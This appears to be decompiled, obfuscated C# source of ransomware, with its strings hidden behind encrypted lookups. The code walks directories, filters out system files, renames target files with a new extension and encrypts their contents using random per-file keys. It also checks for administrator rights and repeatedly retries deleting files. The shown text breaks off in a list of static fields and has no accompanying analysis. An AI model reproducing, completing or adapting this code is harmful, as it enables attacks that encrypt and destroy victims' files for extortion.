using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.Diagnostics;
using System.IO;
using System.IO.MemoryMappedFiles;
using System.Linq;
using System.Net;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security;
using System.Security.AccessControl;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using Microsoft.Win32;
using QnHBxbSdYmUMNG;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace orBiLhAbVg;

internal sealed class MJmySpXyeIcv
{
	public sealed class JafoeRzqNZL
	{
		private static StringCollection eHIuVuENIPsd;

		private static List<string> MHMdTfqabltbYg;

		[NonSerialized]
		internal static GetString getString_0;

		public static List<string> SearchFiles(string string_0)
		{
			List<string> list = new List<string>();
			return WalkDirectoryTree(string_0);
		}

		private static List<string> WalkDirectoryTree(string string_0)
		{
			string[] array = null;
			string[] array2 = null;
			try
			{
				array = Directory.GetFiles(string_0, getString_0(107410329));
			}
			catch
			{
			}
			if (array != null)
			{
				string[] array3 = array;
				foreach (string text in array3)
				{
					try
					{
						if (!text.ToLower().Contains(getString_0(107394265)) && !text.ToLower().Contains(getString_0(107410292)) && !text.ToLower().Contains(getString_0(107394199)) && !text.ToLower().Contains(getString_0(107394186)) && !text.ToLower().Contains(getString_0(107410311)) && !text.ToLower().Contains(getString_0(107394172)) && !text.ToLower().Contains(getString_0(107394536)) && !text.ToLower().Contains(getString_0(107394487)) && !text.ToLower().Contains(getString_0(107394502)) && !text.ToLower().Contains(getString_0(107394453)) && !text.ToLower().Contains(getString_0(107394419)) && !text.ToLower().Contains(getString_0(107394434)) && !text.ToLower().Contains(getString_0(107393873)) && !text.ToLower().Contains(getString_0(107393892)) && !text.ToLower().Contains(getString_0(107393839)) && !text.ToLower().Contains(getString_0(107393858)) && !text.ToLower().Contains(getString_0(107393813)) && !text.ToLower().Contains(getString_0(107393828)) && !text.ToLower().Contains(getString_0(107393779)) && !text.Contains(AmPZukeXOc(getString_0(107393794))) && !text.Contains(getString_0(107393737)) && !text.Contains(getString_0(107393756)) && !text.EndsWith(getString_0(107395367)) && !text.EndsWith(getString_0(107393731)) && !text.EndsWith(getString_0(107393726)) && !text.EndsWith(getString_0(107393721)) && !text.EndsWith(getString_0(107393684)) && !text.ToLower().Contains(getString_0(107393679)) && !text.ToLower().Contains(uDXSolyKZuS))
						{
							if (File.Exists(text) && (double)text.Length <= double.Parse(MDKWxnBlqhkR) * 1024.0 * 1024.0 && hyCSAaxuGHPteVhE == getString_0(107396830))
							{
								MHMdTfqabltbYg.Add(text);
							}
							else if (File.Exists(text) && hyCSAaxuGHPteVhE == getString_0(107396287))
							{
								MHMdTfqabltbYg.Add(text);
							}
						}
					}
					catch
					{
					}
				}
				array2 = Directory.GetDirectories(string_0);
				string[] array4 = array2;
				foreach (string string_ in array4)
				{
					WalkDirectoryTree(string_);
				}
			}
			return MHMdTfqabltbYg;
		}

		static JafoeRzqNZL()
		{
			Strings.CreateGetStringDelegate(typeof(JafoeRzqNZL));
			eHIuVuENIPsd = new StringCollection();
			MHMdTfqabltbYg = new List<string>();
		}
	}

	private sealed class CFUVphoNzERx
	{
		public string lvtJtkNIpNfLk;

		public bool _003CMain_003Eb__4(Process process_0)
		{
			return process_0.ProcessName == lvtJtkNIpNfLk;
		}
	}

	private sealed class qAtqRyNwDK
	{
		private sealed class LMmhpzyLQdyzX
		{
			public qAtqRyNwDK ULZtGTsHdRxnLvl;

			public string slPVSKPqKApEqp;

			public void _003CCrypt_003Eb__1e()
			{
				if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
				{
					tVWzlHZhcvgquxw(WindowsIdentity.GetCurrent().Name, slPVSKPqKApEqp);
				}
			}

			public void _003CCrypt_003Eb__1f()
			{
				XBlPSRuyGIHpK(slPVSKPqKApEqp, ULZtGTsHdRxnLvl.PecobYQVKrlGC, ULZtGTsHdRxnLvl.UXsLiOphxJt, ULZtGTsHdRxnLvl.bEaNqQrDXAyc, ULZtGTsHdRxnLvl.fhWQLOgLdjy);
			}
		}

		public string[] PecobYQVKrlGC;

		public string[] bEaNqQrDXAyc;

		public string fhWQLOgLdjy;

		public string UXsLiOphxJt;

		[NonSerialized]
		internal static GetString getString_0;

		public void _003CCrypt_003Eb__1d(string string_0)
		{
			LMmhpzyLQdyzX CS_0024_003C_003E8__locals0 = new LMmhpzyLQdyzX();
			CS_0024_003C_003E8__locals0.ULZtGTsHdRxnLvl = this;
			CS_0024_003C_003E8__locals0.slPVSKPqKApEqp = string_0;
			if (mnLjajuxoQ && !JYmdtNnSqjF().Contains(getString_0(107392959)))
			{
				Thread thread = new Thread((ThreadStart)delegate
				{
					if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
					{
						tVWzlHZhcvgquxw(WindowsIdentity.GetCurrent().Name, CS_0024_003C_003E8__locals0.slPVSKPqKApEqp);
					}
				});
				thread.Priority = ThreadPriority.Normal;
				thread.IsBackground = true;
				thread.Start();
			}
			if (UPjhbLGdmsrc == getString_0(107396836))
			{
				Thread thread2 = new Thread((ThreadStart)delegate
				{
					XBlPSRuyGIHpK(CS_0024_003C_003E8__locals0.slPVSKPqKApEqp, CS_0024_003C_003E8__locals0.ULZtGTsHdRxnLvl.PecobYQVKrlGC, CS_0024_003C_003E8__locals0.ULZtGTsHdRxnLvl.UXsLiOphxJt, CS_0024_003C_003E8__locals0.ULZtGTsHdRxnLvl.bEaNqQrDXAyc, CS_0024_003C_003E8__locals0.ULZtGTsHdRxnLvl.fhWQLOgLdjy);
				});
				thread2.Priority = ThreadPriority.Normal;
				thread2.IsBackground = false;
				thread2.Start();
				thread2.Join();
			}
			else
			{
				XBlPSRuyGIHpK(CS_0024_003C_003E8__locals0.slPVSKPqKApEqp, PecobYQVKrlGC, UXsLiOphxJt, bEaNqQrDXAyc, fhWQLOgLdjy);
			}
		}

		static qAtqRyNwDK()
		{
			Strings.CreateGetStringDelegate(typeof(qAtqRyNwDK));
		}
	}

	private sealed class WJEbjQEaFJC
	{
		private sealed class dYNytZoEInW
		{
			public WJEbjQEaFJC fgGzpoPNWDs;

			public string GKfxNAYedVm;

			[NonSerialized]
			internal static GetString getString_0;

			public void _003CWorkerCrypter2_003Eb__2b()
			{
				foreach (string item in mxmgbOMGSKJuZ)
				{
					if (GKfxNAYedVm.ToLower().EndsWith(item + fgGzpoPNWDs.hirKHOcivywEBuZ) && xKaluVrlFCfiTysX == getString_0(107396847))
					{
						if (Convert.ToInt32(pzVBYPPLocaArh) * 1024 * 1024 > new FileInfo(GKfxNAYedVm).Length)
						{
							try
							{
								cjKqlcIRmlYL.xPWVYXQJNasgW(getString_0(107395079), getString_0(107395074), getString_0(107395093), GKfxNAYedVm);
							}
							catch
							{
							}
						}
					}
					else if (GKfxNAYedVm.ToLower().EndsWith(item) && xKaluVrlFCfiTysX == getString_0(107396304))
					{
						try
						{
							cjKqlcIRmlYL.xPWVYXQJNasgW(getString_0(107395079), getString_0(107395074), getString_0(107395093), GKfxNAYedVm);
						}
						catch
						{
						}
					}
				}
			}

			static dYNytZoEInW()
			{
				Strings.CreateGetStringDelegate(typeof(dYNytZoEInW));
			}
		}

		private sealed class PCYrNQPdZTmV
		{
			public WJEbjQEaFJC fgGzpoPNWDs;

			public string lsMduQmDoQlkSt;

			[NonSerialized]
			internal static GetString getString_0;

			public void _003CWorkerCrypter2_003Eb__2d()
			{
				foreach (string item in mxmgbOMGSKJuZ)
				{
					if (lsMduQmDoQlkSt.ToLower().EndsWith(item + fgGzpoPNWDs.hirKHOcivywEBuZ) && xKaluVrlFCfiTysX == getString_0(107396850))
					{
						if (Convert.ToInt32(pzVBYPPLocaArh) * 1024 * 1024 > new FileInfo(lsMduQmDoQlkSt).Length)
						{
							try
							{
								cjKqlcIRmlYL.xPWVYXQJNasgW(getString_0(107395082), getString_0(107395077), getString_0(107395096), lsMduQmDoQlkSt);
							}
							catch
							{
							}
						}
					}
					else if (lsMduQmDoQlkSt.ToLower().EndsWith(item) && xKaluVrlFCfiTysX == getString_0(107396307))
					{
						try
						{
							cjKqlcIRmlYL.xPWVYXQJNasgW(getString_0(107395082), getString_0(107395077), getString_0(107395096), lsMduQmDoQlkSt);
						}
						catch
						{
						}
					}
				}
			}

			static PCYrNQPdZTmV()
			{
				Strings.CreateGetStringDelegate(typeof(PCYrNQPdZTmV));
			}
		}

		public List<string> MjbyzCwnSeZjAA;

		public List<string> fpeXxdanfO;

		public string hirKHOcivywEBuZ;

		public string[] wyrOkLcHkeaQN;

		public string CoSpOiSxhQnBVH;

		[NonSerialized]
		internal static GetString getString_0;

		public void _003CWorkerCrypter2_003Eb__2a(string string_0)
		{
			dYNytZoEInW CS_0024_003C_003E8__locals0;
			foreach (string item in fpeXxdanfO)
			{
				if (wyrOkLcHkeaQN.Length != 0)
				{
					string[] array = wyrOkLcHkeaQN;
					int num = 0;
					while (num < array.Length)
					{
						string value = array[num];
						if (!item.EndsWith(value))
						{
							num++;
							continue;
						}
						goto IL_06c5;
					}
				}
				try
				{
					if (item.EndsWith(hirKHOcivywEBuZ))
					{
						goto IL_06c5;
					}
				}
				catch (Exception)
				{
					goto IL_06c5;
				}
				if (!item.EndsWith(string_0) || hHVQkDDqNsnqofdX.Contains(item))
				{
					continue;
				}
				if (euXBqdRgcDg == getString_0(107396844))
				{
					try
					{
						if (IgWkBNpKrR.vgGPQsLwSqqRNkHfbM(item))
						{
							IgWkBNpKrR.lYATGCxpNdy(item);
						}
					}
					catch
					{
					}
				}
				hHVQkDDqNsnqofdX.Add(item);
				if (!jEFdDHVEvpn.Contains(Path.GetDirectoryName(item)))
				{
					jEFdDHVEvpn.Add(Path.GetDirectoryName(item));
				}
				kwRLxOIARCnYa(item);
				try
				{
					try
					{
						if (new FileInfo(item).Length == 0L)
						{
							continue;
						}
					}
					catch (Exception ex2)
					{
						if (hNuljeIxIR)
						{
							try
							{
								File.AppendAllText(hGxNuUuVHRPb, getString_0(107393101) + item + getString_0(107409764) + ex2.Message + getString_0(107396665));
							}
							catch (Exception)
							{
							}
						}
						goto end_IL_00ef;
					}
					if (RPquPXOFWaUBv == getString_0(107396844) && new FileInfo(item).Length > Convert.ToInt32(mhEnUyoGdSryX) * 1024 * 1024 && !MjbyzCwnSeZjAA.Contains(string_0))
					{
						CS_0024_003C_003E8__locals0 = new dYNytZoEInW();
						CS_0024_003C_003E8__locals0.fgGzpoPNWDs = this;
						try
						{
							if (hirKHOcivywEBuZ != getString_0(107392337))
							{
								File.Move(item, item + hirKHOcivywEBuZ);
							}
						}
						catch (Exception ex4)
						{
							if (hNuljeIxIR)
							{
								try
								{
									File.AppendAllText(hGxNuUuVHRPb, getString_0(107393101) + item + getString_0(107409735) + ex4.Message + getString_0(107396665));
									break;
								}
								catch (Exception)
								{
									break;
								}
							}
							break;
						}
						CS_0024_003C_003E8__locals0.GKfxNAYedVm = getString_0(107395027);
						if (hirKHOcivywEBuZ != getString_0(107392337))
						{
							CS_0024_003C_003E8__locals0.GKfxNAYedVm = item + hirKHOcivywEBuZ;
						}
						else
						{
							CS_0024_003C_003E8__locals0.GKfxNAYedVm = item;
						}
						if (hxpzcEFVmmD == getString_0(107396844))
						{
							Thread thread = new Thread((ThreadStart)delegate
							{
								foreach (string item2 in mxmgbOMGSKJuZ)
								{
									if (CS_0024_003C_003E8__locals0.GKfxNAYedVm.ToLower().EndsWith(item2 + CS_0024_003C_003E8__locals0.fgGzpoPNWDs.hirKHOcivywEBuZ) && xKaluVrlFCfiTysX == dYNytZoEInW.getString_0(107396847))
									{
										if (Convert.ToInt32(pzVBYPPLocaArh) * 1024 * 1024 > new FileInfo(CS_0024_003C_003E8__locals0.GKfxNAYedVm).Length)
										{
											try
											{
												cjKqlcIRmlYL.xPWVYXQJNasgW(dYNytZoEInW.getString_0(107395079), dYNytZoEInW.getString_0(107395074), dYNytZoEInW.getString_0(107395093), CS_0024_003C_003E8__locals0.GKfxNAYedVm);
											}
											catch
											{
											}
										}
									}
									else if (CS_0024_003C_003E8__locals0.GKfxNAYedVm.ToLower().EndsWith(item2) && xKaluVrlFCfiTysX == dYNytZoEInW.getString_0(107396304))
									{
										try
										{
											cjKqlcIRmlYL.xPWVYXQJNasgW(dYNytZoEInW.getString_0(107395079), dYNytZoEInW.getString_0(107395074), dYNytZoEInW.getString_0(107395093), CS_0024_003C_003E8__locals0.GKfxNAYedVm);
										}
										catch
										{
										}
									}
								}
							});
							thread.Priority = ThreadPriority.Normal;
							thread.IsBackground = false;
							thread.Start();
						}
						string text = RiuevwwWyyAEMr.poGbvXduoUfH(32);
						string s = iQJHAMSYRoCeWB.xNEMMZlJueN(text);
						byte[] bytes = Encoding.ASCII.GetBytes(s);
						byte[] array2 = null;
						byte[] byte_ = PlbUICyTgm.uFgRNBuxrJhxWug(CS_0024_003C_003E8__locals0.GKfxNAYedVm, Convert.ToInt32(mhEnUyoGdSryX) * 1024 * 1024);
						PlbUICyTgm.slbbArbZqAbLW(qhQaapTyrlC: (!MzQcgykXktlmX) ? (bqQwwzlxGWJXq ? PlbUICyTgm.gVuHxnhVsTtn(byte_, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : PlbUICyTgm.gVuHxnhVsTtn(byte_, Encoding.ASCII.GetBytes(CoSpOiSxhQnBVH), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (bqQwwzlxGWJXq ? tfBsSlrqwKHwiElnO.yjIssJerRssc(byte_, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : tfBsSlrqwKHwiElnO.yjIssJerRssc(byte_, Encoding.ASCII.GetBytes(CoSpOiSxhQnBVH), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })), rOoFWYQfcmSy: CS_0024_003C_003E8__locals0.GKfxNAYedVm, pbehLBuafKw: bytes);
					}
					else
					{
						string text2 = RiuevwwWyyAEMr.poGbvXduoUfH(32);
						string s2 = iQJHAMSYRoCeWB.xNEMMZlJueN(text2);
						byte[] bytes2 = Encoding.ASCII.GetBytes(s2);
						if (hirKHOcivywEBuZ != getString_0(107392337))
						{
							if (!hyVzgCCllZ)
							{
								if (!bqQwwzlxGWJXq)
								{
									bOyNHrBvKPeP(item, item + hirKHOcivywEBuZ, vVDhlTpBNQp);
								}
								else
								{
									bOyNHrBvKPeP(item, item + hirKHOcivywEBuZ, Encoding.ASCII.GetBytes(text2));
								}
							}
							else
							{
								try
								{
									if (!bqQwwzlxGWJXq)
									{
										eELgwvOhTgW(item, item + hirKHOcivywEBuZ, vVDhlTpBNQp);
									}
									else
									{
										eELgwvOhTgW(item, item + hirKHOcivywEBuZ, Encoding.ASCII.GetBytes(text2));
									}
								}
								catch (Exception ex6)
								{
									if (hNuljeIxIR)
									{
										try
										{
											File.AppendAllText(hGxNuUuVHRPb, getString_0(107393101) + item + getString_0(107392291) + ex6.Message + getString_0(107396665));
										}
										catch (Exception)
										{
										}
									}
								}
							}
						}
						else if (!hyVzgCCllZ)
						{
							if (!bqQwwzlxGWJXq)
							{
								bOyNHrBvKPeP(item, item + getString_0(107392332), vVDhlTpBNQp);
							}
							else
							{
								bOyNHrBvKPeP(item, item + getString_0(107392332), Encoding.ASCII.GetBytes(text2));
							}
						}
						else
						{
							try
							{
								if (!bqQwwzlxGWJXq)
								{
									eELgwvOhTgW(item, item, vVDhlTpBNQp);
								}
								else
								{
									eELgwvOhTgW(item, item, Encoding.ASCII.GetBytes(text2));
								}
							}
							catch (Exception ex8)
							{
								if (hNuljeIxIR)
								{
									try
									{
										File.AppendAllText(hGxNuUuVHRPb, getString_0(107393101) + item + getString_0(107392291) + ex8.Message + getString_0(107396665));
									}
									catch (Exception)
									{
									}
								}
							}
						}
						if (bqQwwzlxGWJXq)
						{
							if (hirKHOcivywEBuZ != getString_0(107392337))
							{
								EJthSefGcXhMJA(item + hirKHOcivywEBuZ, bytes2);
							}
							else
							{
								EJthSefGcXhMJA(item, bytes2);
							}
						}
					}
					goto IL_06c5;
					end_IL_00ef:;
				}
				catch (Exception)
				{
					goto IL_06c5;
				}
				continue;
				IL_06c5:
				fpeXxdanfO.Remove(item);
			}
		}

		public void _003CWorkerCrypter2_003Eb__2c(string string_0)
		{
			PCYrNQPdZTmV CS_0024_003C_003E8__locals0 = new PCYrNQPdZTmV();
			CS_0024_003C_003E8__locals0.fgGzpoPNWDs = this;
			CS_0024_003C_003E8__locals0.lsMduQmDoQlkSt = string_0;
			if (wyrOkLcHkeaQN.Length != 0)
			{
				string[] array = wyrOkLcHkeaQN;
				int num = 0;
				while (num < array.Length)
				{
					string value = array[num];
					if (!CS_0024_003C_003E8__locals0.lsMduQmDoQlkSt.EndsWith(value))
					{
						num++;
						continue;
					}
					goto IL_0748;
				}
			}
			try
			{
				if (CS_0024_003C_003E8__locals0.lsMduQmDoQlkSt.EndsWith(hirKHOcivywEBuZ))
				{
					goto IL_0748;
				}
			}
			catch (Exception)
			{
				goto IL_0748;
			}
			if (!hHVQkDDqNsnqofdX.Contains(CS_0024_003C_003E8__locals0.lsMduQmDoQlkSt))
			{
				if (euXBqdRgcDg == getString_0(107396844))
				{
					try
					{
						if (IgWkBNpKrR.vgGPQsLwSqqRNkHfbM(CS_0024_003C_003E8__locals0.lsMduQmDoQlkSt))
						{
							IgWkBNpKrR.lYATGCxpNdy(CS_0024_003C_003E8__locals0.lsMduQmDoQlkSt);
						}
					}
					catch
					{
					}
				}
				hHVQkDDqNsnqofdX.Add(CS_0024_003C_003E8__locals0.lsMduQmDoQlkSt);
				if (!jEFdDHVEvpn.Contains(Path.GetDirectoryName(CS_0024_003C_003E8__locals0.lsMduQmDoQlkSt)))
				{
					jEFdDHVEvpn.Add(Path.GetDirectoryName(CS_0024_003C_003E8__locals0.lsMduQmDoQlkSt));
				}
				kwRLxOIARCnYa(CS_0024_003C_003E8__locals0.lsMduQmDoQlkSt);
				try
				{
					try
					{
						if (new FileInfo(CS_0024_003C_003E8__locals0.lsMduQmDoQlkSt).Length != 0L)
						{
							goto end_IL_0117;
						}
						goto end_IL_0117_2;
						end_IL_0117:;
					}
					catch (Exception ex2)
					{
						if (hNuljeIxIR)
						{
							try
							{
								File.AppendAllText(hGxNuUuVHRPb, getString_0(107393101) + CS_0024_003C_003E8__locals0.lsMduQmDoQlkSt + getString_0(107409764) + ex2.Message + getString_0(107396665));
							}
							catch (Exception)
							{
							}
						}
						goto end_IL_0117_2;
					}
					if (RPquPXOFWaUBv == getString_0(107396844) && new FileInfo(CS_0024_003C_003E8__locals0.lsMduQmDoQlkSt).Length > Convert.ToInt32(mhEnUyoGdSryX) * 1024 * 1024)
					{
						try
						{
							if (hirKHOcivywEBuZ != getString_0(107392337))
							{
								File.Move(CS_0024_003C_003E8__locals0.lsMduQmDoQlkSt, CS_0024_003C_003E8__locals0.lsMduQmDoQlkSt + hirKHOcivywEBuZ);
							}
						}
						catch (Exception ex4)
						{
							if (hNuljeIxIR)
							{
								try
								{
									File.AppendAllText(hGxNuUuVHRPb, getString_0(107393101) + CS_0024_003C_003E8__locals0.lsMduQmDoQlkSt + getString_0(107409735) + ex4.Message + getString_0(107396665));
									return;
								}
								catch (Exception)
								{
									return;
								}
							}
							return;
						}
						if (hirKHOcivywEBuZ != getString_0(107392337))
						{
							CS_0024_003C_003E8__locals0.lsMduQmDoQlkSt += hirKHOcivywEBuZ;
						}
						if (hxpzcEFVmmD == getString_0(107396844))
						{
							Thread thread = new Thread((ThreadStart)delegate
							{
								foreach (string item in mxmgbOMGSKJuZ)
								{
									if (CS_0024_003C_003E8__locals0.lsMduQmDoQlkSt.ToLower().EndsWith(item + CS_0024_003C_003E8__locals0.fgGzpoPNWDs.hirKHOcivywEBuZ) && xKaluVrlFCfiTysX == PCYrNQPdZTmV.getString_0(107396850))
									{
										if (Convert.ToInt32(pzVBYPPLocaArh) * 1024 * 1024 > new FileInfo(CS_0024_003C_003E8__locals0.lsMduQmDoQlkSt).Length)
										{
											try
											{
												cjKqlcIRmlYL.xPWVYXQJNasgW(PCYrNQPdZTmV.getString_0(107395082), PCYrNQPdZTmV.getString_0(107395077), PCYrNQPdZTmV.getString_0(107395096), CS_0024_003C_003E8__locals0.lsMduQmDoQlkSt);
											}
											catch
											{
											}
										}
									}
									else if (CS_0024_003C_003E8__locals0.lsMduQmDoQlkSt.ToLower().EndsWith(item) && xKaluVrlFCfiTysX == PCYrNQPdZTmV.getString_0(107396307))
									{
										try
										{
											cjKqlcIRmlYL.xPWVYXQJNasgW(PCYrNQPdZTmV.getString_0(107395082), PCYrNQPdZTmV.getString_0(107395077), PCYrNQPdZTmV.getString_0(107395096), CS_0024_003C_003E8__locals0.lsMduQmDoQlkSt);
										}
										catch
										{
										}
									}
								}
							});
							thread.IsBackground = false;
							thread.Priority = ThreadPriority.Normal;
							thread.Start();
						}
						string text = RiuevwwWyyAEMr.poGbvXduoUfH(32);
						string s = iQJHAMSYRoCeWB.xNEMMZlJueN(text);
						byte[] bytes = Encoding.ASCII.GetBytes(s);
						byte[] array2 = null;
						byte[] byte_ = PlbUICyTgm.uFgRNBuxrJhxWug(CS_0024_003C_003E8__locals0.lsMduQmDoQlkSt, Convert.ToInt32(mhEnUyoGdSryX) * 1024 * 1024);
						PlbUICyTgm.slbbArbZqAbLW(qhQaapTyrlC: (!MzQcgykXktlmX) ? (bqQwwzlxGWJXq ? PlbUICyTgm.gVuHxnhVsTtn(byte_, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : PlbUICyTgm.gVuHxnhVsTtn(byte_, Encoding.ASCII.GetBytes(CoSpOiSxhQnBVH), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (bqQwwzlxGWJXq ? tfBsSlrqwKHwiElnO.yjIssJerRssc(byte_, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : tfBsSlrqwKHwiElnO.yjIssJerRssc(byte_, Encoding.ASCII.GetBytes(CoSpOiSxhQnBVH), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })), rOoFWYQfcmSy: CS_0024_003C_003E8__locals0.lsMduQmDoQlkSt, pbehLBuafKw: bytes);
					}
					else
					{
						string text2 = RiuevwwWyyAEMr.poGbvXduoUfH(32);
						string s2 = iQJHAMSYRoCeWB.xNEMMZlJueN(text2);
						byte[] bytes2 = Encoding.ASCII.GetBytes(s2);
						if (hirKHOcivywEBuZ != getString_0(107392337))
						{
							if (!hyVzgCCllZ)
							{
								if (!bqQwwzlxGWJXq)
								{
									bOyNHrBvKPeP(CS_0024_003C_003E8__locals0.lsMduQmDoQlkSt, CS_0024_003C_003E8__locals0.lsMduQmDoQlkSt + hirKHOcivywEBuZ, vVDhlTpBNQp);
								}
								else
								{
									bOyNHrBvKPeP(CS_0024_003C_003E8__locals0.lsMduQmDoQlkSt, CS_0024_003C_003E8__locals0.lsMduQmDoQlkSt + hirKHOcivywEBuZ, Encoding.ASCII.GetBytes(text2));
								}
							}
							else
							{
								try
								{
									if (!bqQwwzlxGWJXq)
									{
										eELgwvOhTgW(CS_0024_003C_003E8__locals0.lsMduQmDoQlkSt, CS_0024_003C_003E8__locals0.lsMduQmDoQlkSt + hirKHOcivywEBuZ, vVDhlTpBNQp);
									}
									else
									{
										eELgwvOhTgW(CS_0024_003C_003E8__locals0.lsMduQmDoQlkSt, CS_0024_003C_003E8__locals0.lsMduQmDoQlkSt + hirKHOcivywEBuZ, Encoding.ASCII.GetBytes(text2));
									}
								}
								catch (Exception ex6)
								{
									if (hNuljeIxIR)
									{
										try
										{
											File.AppendAllText(hGxNuUuVHRPb, getString_0(107393101) + CS_0024_003C_003E8__locals0.lsMduQmDoQlkSt + getString_0(107392291) + ex6.Message + getString_0(107396665));
										}
										catch (Exception)
										{
										}
									}
								}
							}
						}
						else if (!hyVzgCCllZ)
						{
							if (!bqQwwzlxGWJXq)
							{
								bOyNHrBvKPeP(CS_0024_003C_003E8__locals0.lsMduQmDoQlkSt, CS_0024_003C_003E8__locals0.lsMduQmDoQlkSt + getString_0(107392332), vVDhlTpBNQp);
							}
							else
							{
								bOyNHrBvKPeP(CS_0024_003C_003E8__locals0.lsMduQmDoQlkSt, CS_0024_003C_003E8__locals0.lsMduQmDoQlkSt + getString_0(107392332), Encoding.ASCII.GetBytes(text2));
							}
						}
						else
						{
							try
							{
								if (!bqQwwzlxGWJXq)
								{
									eELgwvOhTgW(CS_0024_003C_003E8__locals0.lsMduQmDoQlkSt, CS_0024_003C_003E8__locals0.lsMduQmDoQlkSt, vVDhlTpBNQp);
								}
								else
								{
									eELgwvOhTgW(CS_0024_003C_003E8__locals0.lsMduQmDoQlkSt, CS_0024_003C_003E8__locals0.lsMduQmDoQlkSt, Encoding.ASCII.GetBytes(text2));
								}
							}
							catch (Exception ex8)
							{
								if (hNuljeIxIR)
								{
									try
									{
										File.AppendAllText(hGxNuUuVHRPb, getString_0(107393101) + CS_0024_003C_003E8__locals0.lsMduQmDoQlkSt + getString_0(107392291) + ex8.Message + getString_0(107396665));
									}
									catch (Exception)
									{
									}
								}
							}
						}
						if (bqQwwzlxGWJXq)
						{
							if (hirKHOcivywEBuZ != getString_0(107392337))
							{
								EJthSefGcXhMJA(CS_0024_003C_003E8__locals0.lsMduQmDoQlkSt + hirKHOcivywEBuZ, bytes2);
							}
							else
							{
								EJthSefGcXhMJA(CS_0024_003C_003E8__locals0.lsMduQmDoQlkSt, bytes2);
							}
						}
					}
					end_IL_0117_2:;
				}
				catch (Exception)
				{
				}
			}
			goto IL_0748;
			IL_0748:
			fpeXxdanfO.Remove(CS_0024_003C_003E8__locals0.lsMduQmDoQlkSt);
		}

		static WJEbjQEaFJC()
		{
			Strings.CreateGetStringDelegate(typeof(WJEbjQEaFJC));
		}
	}

	private sealed class aoblHarNTvFXohT
	{
		public string gzdWAUmhEiBKNzL;

		public string riRXbelbcgBN;

		public void _003CEncrypt2_003Eb__3a()
		{
			while (true)
			{
				try
				{
					File.Delete(gzdWAUmhEiBKNzL);
					break;
				}
				catch
				{
					Thread.Sleep(1500);
				}
			}
		}

		public void _003CEncrypt2_003Eb__3b()
		{
			while (true)
			{
				try
				{
					if (File.Exists(riRXbelbcgBN))
					{
						File.Delete(riRXbelbcgBN);
					}
					break;
				}
				catch
				{
					Thread.Sleep(1500);
				}
			}
		}
	}

	public static string OnJlbPRXisiwnz;

	public static byte[] vVDhlTpBNQp;

	public static string hyCSAaxuGHPteVhE;

	public static string MDKWxnBlqhkR;

	public static List<string> ZPFWFitHEOz;

	public static List<string> ThdAORTdsxlgArjYH;

	public static string zUiqZNvIPXzzDC;

	public static string CoSpOiSxhQnBVH;

	public static string EiSXecLDoiHoz;

	public static string OsrQCxbVVsCitu;

	public static int pRMQAzXFInpj;

	public static string euXBqdRgcDg;

	public static string xbOCvFGxViyV;

	public static string pGTxrbvFFvWw;

	public static string HugrFqNrCOluH;

	public static string QPxTCZKtKBNbH;

	public static string rglayGzetXEL;

	public static string KAJZPWQXKT;

	public static string RVlCWvulzwYZQm;

	public static List<string> AgWoNnmAIwySiZcF;

	public static List<string> jEFdDHVEvpn;

	public static string EyxlArkVHlrM;

	public static string jMTvTvTWuoVeM;

	public static string ypSTjmFBodBMJl;

	public static List<string> hHVQkDDqNsnqofdX;

	public static string MXVjkFaUjcnce;

	private static string roKZpVREefQFqczv;

	public static string UPjhbLGdmsrc;

	public static string mGxPiIBjUpRU;

	public static List<string> ZaKKBTtZrCeUHU;

	public static List<string> ODWjvMaCnMDTRkh;

	public static List<string> kREXRPjHEpZCoq;

	public static List<string> ppCaAZMFLGKX;

	public static string QPuKALhfazFp;

	public static List<string> jdwHYBvnSeRZoVJU;

	public static List<string> CbRMvMygdTdFS;

	public static string bdGNFbULZa;

	public static string IRehrZgGrXfZCt;

	internal static DateTime ZQEIPelyPW;

	internal static DateTime JjTFwhEfxSQmvJs;

	public static string RPquPXOFWaUBv;

	public static string mhEnUyoGdSryX;

	public static string MkUSgZLeVY;

	public static string KSSvRyXBUcUOgI;

	public static string pgZqbnJzJS;

	public static string jpvtWAhyWjO;

	public static string BHhbCOBcJfrZk;

	public static string hxpzcEFVmmD;

	public static List<string> mxmgbOMGSKJuZ;

	public static string xKaluVrlFCfiTysX;

	public static string pzVBYPPLocaArh;

	public static string PXEfmUjeNij;

	public static string nopWpwvsZmQqrg;

	public static string ogApcjbtSODOz;

	public static string zxzFwgxFQS;

	public static string VkYXpgSyEWv;

	public static string bgMiIlAmeujrdba;

	public static string XeiOyGSlBpKa;

	public static string KbknTRovBJzhfX;

	public static string EPbARKoXDAtjP;

	public static string jrhFXKepddayA;

	public static string YfiKIVLyCrwm;

	public static string bgnupzRljZvH;

	public static string aUdoXnQBvdksvzFr;

	public static string bVRbnMOzQSx;

	public static string xyjcUzChAQOKX;

	public static string dlHxTvOFnFVy;

	public static string ZarUZCXPbvIKK;

	public static string uDXSolyKZuS;

	public static string nOizlZFiCOj;

	public static string jHNSDTQTZX;

	public static string dtSaeIkgqdX;

	public static string oUkHvlolsxmZ;

	public static string hLIVLHeHJhf;

	public static string IwmBMXxkSMFo;

	public static string YPTUEdfODILjvW;

	public static string CMmqnsKDpqc;

	public static string WHujAzyFWUcX;

	public static string[] RdQxlJArxXaLAOF;

	public static string iUKXcFGtGy;

	public static bool MzQcgykXktlmX;

	public static string YXOdfUsozAf;

	public static bool bqQwwzlxGWJXq;

	public static bool uaaCZSIjXODakWD;

	public static bool WioJzBJzcy;

	public static bool kUTgXAQchF;

